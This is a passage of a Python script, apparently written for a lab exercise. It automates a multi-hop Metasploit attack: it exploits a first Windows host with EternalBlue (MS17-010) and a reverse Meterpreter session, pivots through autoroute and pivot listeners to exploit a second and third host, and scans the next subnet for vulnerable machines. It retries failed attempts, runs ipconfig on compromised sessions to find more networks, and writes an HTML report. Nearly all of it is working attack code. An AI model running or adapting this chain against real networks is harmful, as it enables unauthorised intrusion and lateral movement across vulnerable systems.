        eb_pivot(M2_IP, M1_NIC2, PIVOT_PORT) + poll_block(15, 20) + [
        'sessions -i 2 -C "ipconfig"', "sleep 5", "sessions -l", "exit -y",
    ])

    step3_out = run_rc(step3_rc, step3_log)

    if "Meterpreter session 2 opened" in step3_out:
        session2_opened = True
        log(f"[+] Session 2 opened on attempt {attempt}!")
        break
    else:
        log(f"[-] Attempt {attempt} failed.")
        if attempt < MAX_RETRIES:
            log(f"[*] Waiting {RETRY_SLEEP}s before retry...")
            time.sleep(RETRY_SLEEP)

if not session2_opened:
    log("[-] Session 2 did not open. Exiting."); sys.exit(1)

M2_NIC2 = parse_nic2_ip(step3_out, M1_PREFIX, M2_PREFIX_R)
if not M2_NIC2:
    log("[-] Could not parse M2 NIC2. Exiting."); sys.exit(1)

M3_PREFIX = ".".join(M2_NIC2.split(".")[:3])
M3_SUBNET = f"{M3_PREFIX}.0/29"
state.update({"M2_NIC2": M2_NIC2, "M3_PREFIX": M3_PREFIX, "M3_SUBNET": M3_SUBNET})
log(f"[+] M3 subnet: {M3_SUBNET}  |  M2 NIC2: {M2_NIC2}")
save_state()
S2_TIME = parse_session_time(step3_out, 2)

log("[*] Waiting 60s for machines to recover...")
time.sleep(60)

# ══════════════════════════════════════════════════════════════════════════════
# STEP 4 — Full chain + scan M3 subnet
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(f">>> STEP 4: Full chain + scan {M3_SUBNET} to find M3...")

step4_out   = ""
session2_s4 = False

for attempt in range(1, MAX_RETRIES + 1):
    log(f"[*] Attempt {attempt}/{MAX_RETRIES} for Session 2 (step4)...")
    step4_rc  = os.path.join(OUTPUT_DIR, f"step4_attempt{attempt}.rc")
    step4_log = os.path.join(OUTPUT_DIR, f"step4_attempt{attempt}_{TIMESTAMP}.log")

    write_rc(step4_rc, [
        "setg ExitOnSession false",
    ] + eb_direct(M1_IP, LHOST, LPORT) + [
        "sleep 40", "sessions -l",
    ] + autoroute_block(1) + pivot_setup_block(1, PIVOT_PORT) + \
        eb_pivot(M2_IP, M1_NIC2, PIVOT_PORT) + poll_block(15, 20) + [
        "sessions -l",
    ] + autoroute_block(2) + [
        "use auxiliary/scanner/smb/smb_ms17_010",
        f"set RHOSTS {M3_SUBNET}", "set THREADS 1",
        "run", "sleep 30", "sessions -l", "exit -y",
    ])

    step4_out = run_rc(step4_rc, step4_log)

    if "Meterpreter session 2 opened" in step4_out:
        session2_s4 = True
        log(f"[+] Session 2 opened on attempt {attempt}!")
        break
    else:
        log(f"[-] Attempt {attempt} failed.")
        if attempt < MAX_RETRIES:
            log(f"[*] Waiting {RETRY_SLEEP}s before retry...")
            time.sleep(RETRY_SLEEP)

if not session2_s4:
    log("[-] Session 2 (step4) failed. Exiting."); sys.exit(1)

vuln_in_m3    = parse_vulnerable_in_subnet(step4_out, M3_PREFIX)
M3_candidates = [ip for ip in vuln_in_m3 if ip != M2_NIC2]
if not M3_candidates:
    log("[-] No vulnerable M3 host found. Exiting."); sys.exit(1)

M3_IP = M3_candidates[0]
M3_OS = parse_os_from_scan(step4_out, M3_IP)
M3_PREFIX_R = ".".join(M3_IP.split(".")[:3])
state["M3_IP"] = M3_IP
log(f"[+] M3 = {M3_IP}")
save_state()

log("[*] Waiting 60s for machines to recover...")
time.sleep(60)

# ══════════════════════════════════════════════════════════════════════════════
# STEP 5 — Full chain + exploit M3
#          Also runs ipconfig on M3 to discover M4 subnet if it exists
#          Uses find_session_for_ip to handle duplicate sessions correctly
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(f">>> STEP 5: Full chain → exploit M3 ({M3_IP})...")

step5_out       = ""
session3_opened = False
S3_TIME         = "N/A"
M3_NIC2         = None
M4_SUBNET       = None

for attempt in range(1, MAX_RETRIES + 1):
    log(f"[*] Attempt {attempt}/{MAX_RETRIES} for Session 3...")
    step5_rc  = os.path.join(OUTPUT_DIR, f"step5_attempt{attempt}.rc")
    step5_log = os.path.join(OUTPUT_DIR, f"step5_attempt{attempt}_{TIMESTAMP}.log")

    # Find the correct session number for M3 dynamically
    # We run ipconfig on the session that has M3's IP
    write_rc(step5_rc, [
        "setg ExitOnSession false",
    ] + eb_direct(M1_IP, LHOST, LPORT) + [
        "sleep 40", "sessions -l",
    ] + autoroute_block(1) + pivot_setup_block(1, PIVOT_PORT) + \
        eb_pivot(M2_IP, M1_NIC2, PIVOT_PORT) + poll_block(15, 20) + [
        "sessions -l",
    ] + autoroute_block(2) + pivot_setup_block(2, PIVOT_PORT2) + \
        eb_pivot(M3_IP, M2_NIC2, PIVOT_PORT2) + poll_block(15, 20) + [
        "sessions -l",
        # run ipconfig on every possible session number that could be M3
        # the right one will succeed, wrong ones will just error silently
        'sessions -i 3 -C "ipconfig"',
        "sleep 3",
        'sessions -i 4 -C "ipconfig"',
        "sleep 3",
        'sessions -i 5 -C "ipconfig"',
        "sleep 3",
        "sessions -l",
        "exit -y",
    ])

    step5_out = run_rc(step5_rc, step5_log)

    if "Meterpreter session 3 opened" in step5_out or \
       "Meterpreter session 4 opened" in step5_out or \
       "Meterpreter session 5 opened" in step5_out:
        session3_opened = True
        log(f"[+] Session on M3 opened on attempt {attempt}!")
        break
    else:
        log(f"[-] Attempt {attempt} failed.")
        if attempt < MAX_RETRIES:
            log(f"[*] Waiting {RETRY_SLEEP}s before retry...")
            time.sleep(RETRY_SLEEP)

if not session3_opened:
    log("[-] Session on M3 failed. Exiting."); sys.exit(1)

# Find the actual session number for M3 by matching IP in output
m3_session_num = find_session_for_ip(step5_out, M3_IP)
if m3_session_num:
    S3_TIME = parse_session_time(step5_out, int(m3_session_num))
    log(f"[+] M3 is Session {m3_session_num}")

# Parse M3 NIC2 — exclude all known prefixes
M3_NIC2 = parse_nic2_ip(step5_out, M1_PREFIX, M2_PREFIX_R, M3_PREFIX_R)
if M3_NIC2:
    M4_PREFIX = ".".join(M3_NIC2.split(".")[:3])
    M4_SUBNET = f"{M4_PREFIX}.0/29"
    state.update({"M3_NIC2": M3_NIC2, "M4_SUBNET": M4_SUBNET})
    log(f"[+] M3 NIC2 = {M3_NIC2}  →  M4 subnet discovered: {M4_SUBNET}")
    log("[*] M4 subnet discovered — further pivot is possible but stopping here.")
else:
    log("[*] M3 has no second NIC — end of chain.")

state["COMPLETE"] = "true"
save_state()
log(f"[+] Chain complete! M1={M1_IP}  M2={M2_IP}  M3={M3_IP}")

# ══════════════════════════════════════════════════════════════════════════════
# GENERATE REPORT
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(">>> Generating HTML report...")

M1_OS = "Windows (version unknown)"
for line in vuln_nmap_outputs.get(M1_IP, "").splitlines():
    if "Windows" in line and ("x64" in line or "x86" in line or "Service Pack" in line):
        M1_OS = line.strip().lstrip("|").strip()
        break

targets = [
    {
        "session_num"    : 1,
        "ip"             : M1_IP,
        "subnet"         : KALI_SUBNET,
        "os_str"         : M1_OS,
        "session_time"   : S1_TIME,
        "exploit_module" : "exploit/windows/smb/ms17_010_eternalblue",
        "via"            : None,
        "pivot_port"     : None,
        "pivot_port_out" : PIVOT_PORT,
    },
    {
        "session_num"    : 2,
        "ip"             : M2_IP,
        "subnet"         : M2_SUBNET,
        "os_str"         : M2_OS,
        "session_time"   : S2_TIME,
        "exploit_module" : "exploit/windows/smb/ms17_010_eternalblue_win8",
        "via"            : 1,
        "pivot_port"     : PIVOT_PORT,
        "pivot_port_out" : PIVOT_PORT2,
    },
    {
        "session_num"    : 3,
        "ip"             : M3_IP,
        "subnet"         : M3_SUBNET,
        "os_str"         : M3_OS,
        "session_time"   : S3_TIME,
        "exploit_module" : "exploit/windows/smb/ms17_010_eternalblue_win8",
        "via"            : 2,
        "pivot_port"     : PIVOT_PORT2,
        "pivot_port_out" : None,
    },
]

report_path = generate_html_report(targets, M3_NIC2, M4_SUBNET)
log(f"[+] Done! Open your report at: {report_path}")
